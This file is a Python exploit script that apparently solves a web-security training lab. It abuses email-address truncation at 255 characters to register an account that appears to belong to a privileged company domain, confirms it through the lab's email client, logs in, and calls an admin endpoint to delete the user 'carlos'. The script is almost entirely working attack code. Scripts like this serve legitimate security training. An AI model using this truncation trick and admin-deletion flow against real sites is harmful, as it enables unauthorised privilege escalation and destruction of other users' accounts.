#!/usr/bin/env python3
import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    return soup.find("input", {"name": "csrf"})["value"]

def get_email_client(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    email = soup.find("a", {"id": "exploit-link"})["href"]
    print(f"[+] Email client: {email}")
    return email

def register(s, url, email):
    print(f"[*] Registering with email: {email}")
    register_page = url + "/register"
    csrf = get_csrf_token(s, register_page)
    data = {"csrf": csrf, "username": "test", "email": email, "password": "test"}
    r = s.post(register_page, data=data, verify=False, allow_redirects=True, proxies=proxies, timeout=10)
    if "Please check your emails" in r.text:
        return True
    return False

def get_confirmation_link(s, email_url):
    print("[*] Grabbing confirmation link...")
    r = s.get(email_url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    link = soup.find("a", href=re.compile("temp-registration"))
    return link["href"]

def login(s, url, username, password):
    login_page = url + "/login"
    csrf = get_csrf_token(s, login_page)
    data = {"csrf": csrf, "username": username, "password": password}
    r = s.post(login_page, data=data, verify=False, allow_redirects=True, proxies=proxies, timeout=10)
    if "Log out" in r.text:
        return True
    return False

def delete_carlos(s, url):
    print("[*] Deleting carlos...")
    r = s.get(url + "/admin/delete?username=carlos", verify=False, proxies=proxies, timeout=10)
    if "Congratulations" in r.text:
        print("[+] Carlos deleted - Lab solved!")
        return True
    print("[-] Failed to delete carlos")
    return False

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    email_url = get_email_client(s, url)
    email_domain = email_url.split("//")[1].split("/")[0]

    # craft email so that @dontwannacry.com lands exactly on character 255
    # 255 - len("@dontwannacry.com") = 238 characters before the @
    target_domain = "dontwannacry.com"
    prefix_length = 255 - len("@" + target_domain)
    crafted_email = ("a" * prefix_length) + "@" + target_domain + "." + email_domain
    print(f"[+] Crafted email length: {len(crafted_email)}")
    print(f"[+] Crafted email: {crafted_email}")

    if not register(s, url, crafted_email):
        print("[-] Registration failed")
        return
    print("[+] Registration successful")

    confirmation_link = get_confirmation_link(s, email_url)
    print(f"[+] Confirmation link: {confirmation_link}")
    s.get(confirmation_link, verify=False, proxies=proxies)
    print("[+] Account confirmed")

    if not login(s, url, "test", "test"):
        print("[-] Login failed")
        return
    print("[+] Login successful")

    delete_carlos(s, url)

if __name__ == "__main__":
    main()